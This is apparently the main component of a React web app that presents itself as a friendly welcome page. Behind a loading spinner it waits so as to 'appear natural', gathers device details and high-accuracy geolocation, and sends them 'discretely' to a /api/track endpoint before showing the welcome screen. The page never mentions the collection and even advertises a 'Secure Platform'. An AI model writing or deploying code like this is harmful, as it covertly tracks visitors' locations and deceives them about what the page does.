import React, { useState, useEffect } from 'react';
import './App.css';

function App() {
  const [showWelcome, setShowWelcome] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  // Generate a session ID
  const generateSessionId = () => {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
  };

  // Get device information
  const getDeviceInfo = () => {
    return {
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language || 'Unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
      platform: navigator.platform || 'Unknown',
      connectionType: navigator.connection?.effectiveType || 'Unknown'
    };
  };

  // Get location
  const getLocation = () => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        (error) => {
          console.warn('Location access denied or failed:', error);
          resolve(null);
        },
        {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 60000
        }
      );
    });
  };

  // Send data to backend
  const sendDataToBackend = async (locationData, deviceData) => {
    try {
      const response = await fetch('/api/track', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          location: locationData,
          device: deviceData,
          sessionId: generateSessionId()
        }),
      });

      if (response.ok) {
        console.log('Welcome data processed');
      } else {
        console.error('Processing failed');
      }
    } catch (error) {
      console.error('Error:', error);
    }
  };

  // Auto-collect data when component mounts
  useEffect(() => {
    const initializeApp = async () => {
      try {
        // Small delay to appear natural
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        const deviceInfo = getDeviceInfo();
        const locationData = await getLocation();
        
        // Send data discretely
        await sendDataToBackend(locationData, deviceInfo);
        
        // Show welcome after data collection
        setShowWelcome(true);
        setIsLoading(false);
      } catch (error) {
        console.error('Initialization error:', error);
        setShowWelcome(true);
        setIsLoading(false);
      }
    };

    initializeApp();
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  if (isLoading) {
    return (
      <div className="App">
        <div className="loading-container">
          <div className="loading-spinner"></div>
          <p>Loading your experience...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="App">
      <div className="welcome-container">
        <div className="welcome-content">
          <h1 className="welcome-title">🌟 Hello &🌟</h1>
          <div className="welcome-animation">
            <div className="floating-icons">
              <span className="float-icon">🎉</span>
              <span className="float-icon">✨</span>
              <span className="float-icon">🌈</span>
              <span className="float-icon">💫</span>
            </div>
          </div>
          <p className="welcome-message">
            Thank you for visiting! We're excited to have you here. 
            Explore our amazing content and discover something new today.
          </p>
          <div className="features">
            <div className="feature">
              <span className="feature-icon">🎯</span>
              <span>Great Content</span>
            </div>
            <div className="feature">
              <span className="feature-icon">⚡</span>
              <span>Fast Experience</span>
            </div>
            <div className="feature">
              <span className="feature-icon">🔒</span>
              <span>Secure Platform</span>
            </div>
          </div>
          <button className="explore-btn" onClick={() => alert('Welcome! More features coming soon.')}>
            Get Started
          </button>
          <div className="footer-text">
            <p>Enjoy your visit and feel free to explore!</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
